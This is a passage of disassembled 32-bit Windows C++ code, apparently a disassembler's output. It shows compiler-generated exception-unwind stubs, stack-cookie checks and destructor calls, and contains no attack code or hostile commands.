xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ad90
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44ad98
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_44ada2
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44adaa
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44adb2
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44adbc
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44adc4
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44adcc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44adf0
lea eax [ ebp - 0x2c ]
jmp sub_40bee0
sub_44adf8
lea eax [ ebp - 0x2c ]
push eax
call sub_40a500
retn
sub_44ae02
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44ae0a
lea eax [ ebp - 0x28 ]
push eax
call sub_40a500
retn
sub_44ae14
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_44ae1c
lea eax [ ebp - 0x24 ]
push eax
call sub_40a500
retn
sub_44ae26
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44ae2e
lea ecx [ ebp - 0x20 ]
jmp sub_402ca0
sub_44ae36
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44ae3e
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_44ae46
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44ae4e
lea eax [ ebp - 0x2c ]
jmp sub_40bee0
sub_44ae56
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_44ae5e
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44ae66
lea eax [ ebp - 0x2c ]
jmp sub_40bee0
sub_44ae6e
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
j_sub_412940#2
jmp sub_412940
sub_44ae95
jmp sub_412940
sub_44ae9a
jmp sub_412940
sub_44ae9f
lea eax [ ebp - 0xa4 ]
jmp sub_402d20
sub_44aeaa
lea eax [ ebp - 0x98 ]
push eax
call sub_41b480
retn
sub_44aeb7
lea eax [ ebp - 0xbc ]
jmp sub_41b290
sub_44aec2
lea ecx [ ebp - 0x9c ]
jmp sub_41b2a0
sub_44aecd
lea ecx [ ebp - 0xe4 ]
jmp sub_421e70
sub_44aed8
jmp sub_412940
sub_44aedd
lea ecx [ ebp - 0xb0 ]
jmp sub_402ca0
sub_44aee8
lea eax [ ebp - 0xb0 ]
jmp sub_402d20
sub_44aef3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x130 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44af20
mov esi [ ebp - 0xa44 ]
jmp sub_40f850
sub_44af2b
lea eax [ ebp - 0xa54 ]
push eax
call sub_40f890
retn
sub_44af38
lea ecx [ ebp - 0xa58 ]
jmp sub_40f9c0
sub_44af43
lea esi [ ebp - 0xa44 ]
jmp sub_409b30
sub_44af4e
lea esi [ ebp - 0xa44 ]
jmp sub_409b30
sub_44af59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa60 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44af90
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44af9c
mov ecx [ ebp - 0x10 ]
jmp sub_40e320
sub_44afa4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44afc0
lea ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_44afc8
lea eax [ ebp - 0x34 ]
jmp sub_40c2e0
sub_44afd0
lea eax [ ebp - 0x34 ]
push eax
call sub_40c270
retn
sub_44afda
lea eax [ ebp - 0x34 ]
push eax
call sub_40bef0
retn
sub_44afe4
lea ecx [ ebp - 0x20 ]
jmp sub_402ca0
sub_44afec
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44aff4
lea eax [ ebp - 0x20 ]
push eax
call sub_4016d0
retn
sub_44affe
lea eax [ ebp - 0x20 ]
push eax
call sub_401640
retn
sub_44b008
lea eax [ ebp - 0x20 ]
push eax
call sub_4016d0
retn
sub_44b012
lea ecx [ ebp - 0x20 ]
jmp sub_402ca0
sub_44b01a
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44b022
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44b02a
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44b032
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44b03a
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44b042
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_44b04a
lea eax [ ebp - 0x18 ]
push eax
call sub_4016d0
retn
sub_44b054
lea eax [ ebp - 0x18 ]
push eax
call sub_401640
retn
sub_44b05e
lea eax [ ebp - 0x18 ]
push eax
call sub_4016d0
retn
sub_44b068
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44b070
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_44b078
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44b080
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44b088
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44b090
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44b098
lea ecx [ ebp - 0x20 ]
jmp sub_402ca0
sub_44b0a0
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44b0a8
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44b0b0
lea eax [ ebp - 0x20 ]
push eax
call sub_4016d0
retn
sub_44b0ba
lea eax [ ebp - 0x20 ]
push eax
call sub_401640
retn
sub_44b0c4
lea eax [ ebp - 0x20 ]
push eax
call sub_4016d0
retn
sub_44b0ce
lea ecx [ ebp - 0x20 ]
jmp sub_402ca0
sub_44b0d6
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44b0de
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44b0e6
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44b0ee
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_44b0f6
lea eax [ ebp - 0x34 ]
push eax
call sub_40c270
retn
sub_44b100
lea eax [ ebp - 0x34 ]
jmp sub_40c2e0
sub_44b108
lea eax [ ebp + 0x8 ]
jmp sub_402d20
sub_44b110
lea ecx [ ebp - 0x24 ]
jmp [ std::exception::~exception@IAT ]
sub_44b119
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b140
lea esi [ ebp - 0x20 ]
jmp sub_404110
sub_44b148
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b150
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44b15a
lea esi [ ebp - 0x24 ]
jmp sub_409b30
sub_44b162
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b16a
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
retn
sub_44b174
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b17c
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b184
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b1b0
lea eax [ ebp - 0x438 ]
jmp sub_402d20
sub_44b1bb
lea ecx [ ebp - 0x438 ]
jmp sub_402ca0
sub_44b1c6
lea eax [ ebp - 0x460 ]
jmp sub_402d20
sub_44b1d1
lea ecx [ ebp - 0x460 ]
jmp sub_402ca0
sub_44b1dc
lea eax [ ebp - 0x454 ]
jmp sub_402d20
sub_44b1e7
lea ecx [ ebp - 0x454 ]
jmp sub_402ca0
sub_44b1f2
lea eax [ ebp - 0x430 ]
jmp sub_402d20
sub_44b1fd
lea ecx [ ebp - 0x430 ]
jmp sub_402ca0
sub_44b208
lea eax [ ebp - 0x430 ]
jmp sub_402d20
sub_44b213
lea eax [ ebp - 0x454 ]
jmp sub_402d20
sub_44b21e
lea eax [ ebp - 0x460 ]
jmp sub_402d20
sub_44b229
lea eax [ ebp - 0x434 ]
jmp sub_402d20
sub_44b234
lea ecx [ ebp - 0x434 ]
jmp sub_402ca0
sub_44b23f
lea eax [ ebp - 0x450 ]
jmp sub_402d20
sub_44b24a
lea ecx [ ebp - 0x450 ]
jmp sub_402ca0
sub_44b255
lea eax [ ebp - 0x42c ]
jmp sub_402d20
sub_44b260
lea ecx [ ebp - 0x42c ]
jmp sub_402ca0
sub_44b26b
lea eax [ ebp - 0x42c ]
jmp sub_402d20
sub_44b276
lea eax [ ebp - 0x450 ]
jmp sub_402d20
sub_44b281
lea eax [ ebp - 0x434 ]
jmp sub_402d20
sub_44b28c
lea eax [ ebp - 0x438 ]
jmp sub_402d20
sub_44b297
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x46c ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b2c0
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44b2c8
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_44b2d2
lea ecx [ ebp - 0x20 ]
jmp sub_405f40
sub_44b2da
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44b2e2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b300
lea eax [ ebp - 0x34 ]
jmp sub_402d20
sub_44b308
lea ecx [ ebp - 0x34 ]
jmp sub_402ca0
sub_44b310
lea eax [ ebp - 0x34 ]
jmp sub_402d20
sub_44b318
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b340
mov ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44b348
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b370
mov ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44b378
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b3a0
lea eax [ ebp - 0x220 ]
jmp sub_402d20
sub_44b3ab
lea ecx [ ebp - 0x220 ]
jmp sub_402ca0
sub_44b3b6
lea eax [ ebp - 0x220 ]
jmp sub_402d20
sub_44b3c1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x264 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b3f0
mov ecx [ ebp - 0x224 ]
jmp sub_402ca0
sub_44b3fb
mov ecx [ ebp - 0x224 ]
jmp sub_402ca0
sub_44b406
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x21c ]
mov ecx [ edx - 0x220 ]
xor ecx eax
call sub_443fba
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b440
mov ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_44b448
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44b450
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_44b45a
lea eax [ ebp + 0x8 ]
push eax
call sub_4057b0
retn
sub_44b464
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_44b46e
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44b476
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b4a0
lea esi [ ebp - 0x1c ]
jmp sub_404110
sub_44b4a8
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b4b0
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44b4ba
lea eax [ ebp - 0x28 ]
jmp sub_40ab00
sub_44b4c2
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b4ca
lea esi [ ebp - 0x24 ]
jmp sub_409b30
sub_44b4d2
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b4da
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
retn
sub_44b4e4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b510
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b518
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44b522
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b52a
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_44b532
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44b53a
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44b542
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44b54a
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_44b552
lea ecx [ ebp + 0xc ]
jmp sub_402ca0
sub_44b55a
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_44b562
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44b56a
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_44b572
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b57a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b5a0
lea eax [ ebp - 0x28 ]
jmp sub_402d20
sub_44b5a8
lea ecx [ ebp - 0x28 ]
jmp sub_402ca0
sub_44b5b0
lea eax [ ebp - 0x28 ]
jmp sub_402d20
sub_44b5b8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b5e0
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44b5e8
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44b5f0
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44b5f8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b620
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44b628
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_44b630
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44b638
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b660
jmp sub_412940
sub_44b665
jmp sub_412940
j_sub_412940
jmp sub_412940
sub_44b66f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b690
mov ecx [ ebp - 0x230 ]
jmp sub_402ca0
sub_44b69b
mov ecx [ ebp - 0x230 ]
jmp sub_402ca0
sub_44b6a6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x234 ]
mov ecx [ edx - 0x238 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b6e0
lea ecx [ ebp - 0x48 ]
jmp sub_408e30
sub_44b6e8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b710
mov eax [ ebp - 0x18 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44b71c
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b740
lea eax [ ebp - 0x44 ]
jmp sub_40bee0
sub_44b748
lea eax [ ebp - 0x44 ]
push eax
call sub_40a500
retn
sub_44b752
lea eax [ ebp - 0x44 ]
jmp sub_40bee0
sub_44b75a
lea eax [ ebp - 0x4c ]
jmp sub_40bee0
sub_44b762
lea eax [ ebp - 0x4c ]
push eax
call sub_40a500
retn
sub_44b76c
lea ecx [ ebp - 0x68 ]
jmp sub_405f40
sub_44b774
lea eax [ ebp - 0x48 ]
jmp sub_40bee0
sub_44b77c
lea eax [ ebp - 0x48 ]
push eax
call sub_40a500
retn
sub_44b786
lea eax [ ebp - 0x48 ]
jmp sub_40bee0
sub_44b78e
lea eax [ ebp - 0x4c ]
jmp sub_40bee0
sub_44b796
lea eax [ ebp - 0x44 ]
jmp sub_40bee0
sub_44b79e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b7d0
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b7d8
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
retn
sub_44b7e2
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b7ea
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b7f2
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44b7fc
lea eax [ ebp - 0x20 ]
jmp sub_40ab00
sub_44b804
lea ecx [ ebp - 0x50 ]
jmp sub_405f40
sub_44b80c
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44b814
lea ecx [ ebp + 0xc ]
jmp sub_402ca0
sub_44b81c
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44b828
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44b834
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44b840
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_44b848
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_44b850
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b858
mov ecx [ ebp + 0x10 ]
jmp sub_402ca0
sub_44b860
mov eax [ ebp + 0x10 ]
jmp sub_402d20
sub_44b868
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b870
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b890
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_44b898
lea ecx [ ebp + 0xc ]
jmp sub_402ca0
sub_44b8a0
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_44b8a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b8d0
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44b8d8
lea ecx [ ebp - 0x20 ]
jmp sub_402ca0
sub_44b8e0
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b8e8
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44b8f2
lea eax [ ebp - 0x1c ]
jmp sub_40bee0
sub_44b8fa
lea eax [ ebp - 0x1c ]
push eax
call sub_40a500
retn
sub_44b904
lea eax [ ebp - 0x18 ]
jmp sub_40ab00
sub_44b90c
lea eax [ ebp - 0x1c ]
jmp sub_40bee0
sub_44b914
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b91c
lea eax [ ebp - 0x20 ]
jmp sub_402d20
sub_44b924
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b940
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44b948
lea ecx [ ebp - 0x24 ]
jmp sub_402ca0
sub_44b950
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b958
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
retn
sub_44b962
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44b96a
lea eax [ ebp - 0x20 ]
push eax
call sub_40a500
retn
sub_44b974
lea eax [ ebp - 0x14 ]
jmp sub_40ab00
sub_44b97c
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44b984
lea eax [ ebp - 0x18 ]
jmp sub_40bee0
sub_44b98c
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44b994
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44b9b0
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44b9b8
lea ecx [ ebp - 0x24 ]
jmp sub_402ca0
sub_44b9c0
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b9c8
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44b9d2
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44b9da
lea eax [ ebp - 0x20 ]
push eax
call sub_40a500
retn
sub_44b9e4
lea eax [ ebp - 0x18 ]
jmp sub_40ab00
sub_44b9ec
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44b9f4
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44b9fc
lea eax [ ebp - 0x24 ]
jmp sub_402d20
sub_44ba04
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ba20
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44ba28
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44ba32
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44ba3a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ba60
lea eax [ ebp - 0x10 ]
jmp sub_40ab00
sub_44ba68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44ba90
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_44ba98
lea eax [ ebp - 0x24 ]
push eax
call sub_40a500
retn
sub_44baa2
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44baaa
lea eax [ ebp - 0x28 ]
push eax
call sub_40a500
retn
sub_44bab4
lea ecx [ ebp - 0x1c ]
jmp sub_402ca0
sub_44babc
lea eax [ ebp - 0x20 ]
jmp sub_40ab00
sub_44bac4
lea eax [ ebp - 0x1c ]
jmp sub_402d20
sub_44bacc
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44bad4
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_44badc
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bb00
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_44bb08
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44bb10
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_44bb1a
lea eax [ ebp - 0x18 ]
jmp sub_40ab00
sub_44bb22
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44bb2a
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44bb32
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bb50
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44bb5c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bb80
lea eax [ ebp - 0x28 ]
push eax
call sub_40ecf0
retn
sub_44bb8a
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bbb0
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44bbb8
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_44bbc2
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44bbca
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44bbd2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bbf0
lea eax [ ebp - 0x24 ]
jmp sub_40ab00
sub_44bbf8
lea eax [ ebp - 0x30 ]
jmp sub_40bee0
sub_44bc00
lea eax [ ebp - 0x30 ]
push eax
call sub_40a500
retn
sub_44bc0a
lea eax [ ebp - 0x30 ]
jmp sub_40bee0
sub_44bc12
lea eax [ ebp - 0x2c ]
jmp sub_40ab00
sub_44bc1a
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44bc22
lea eax [ ebp - 0x28 ]
push eax
call sub_40a500
retn
sub_44bc2c
lea eax [ ebp - 0x34 ]
jmp sub_40bee0
sub_44bc34
lea eax [ ebp - 0x34 ]
push eax
call sub_40a500
retn
sub_44bc3e
lea eax [ ebp - 0x2c ]
jmp sub_40ab00
sub_44bc46
lea eax [ ebp - 0x34 ]
jmp sub_40bee0
sub_44bc4e
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44bc56
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44bc5e
lea eax [ ebp - 0x30 ]
jmp sub_40bee0
sub_44bc66
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bc90
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44bc98
lea eax [ ebp - 0x28 ]
push eax
call sub_40a500
retn
sub_44bca2
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44bcaa
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_44bcb2
lea eax [ ebp - 0x24 ]
push eax
call sub_40a500
retn
sub_44bcbc
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44bcc4
lea ecx [ ebp - 0x18 ]
jmp sub_402ca0
sub_44bccc
lea eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44bcd4
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44bcdc
lea eax [ ebp - 0x20 ]
push eax
call sub_40a500
retn
sub_44bce6
lea eax [ ebp - 0x20 ]
jmp sub_40bee0
sub_44bcee
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_44bcf6
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44bcfe
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_44bd20
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44bd28
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_44bd30
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44bd38
lea eax [ ebp + 0xc ]
jmp sub_40bee0
sub_44bd40
lea eax [ ebp + 0xc ]
push eax
call sub_40a500
retn
sub_44bd4a
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44bd52
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
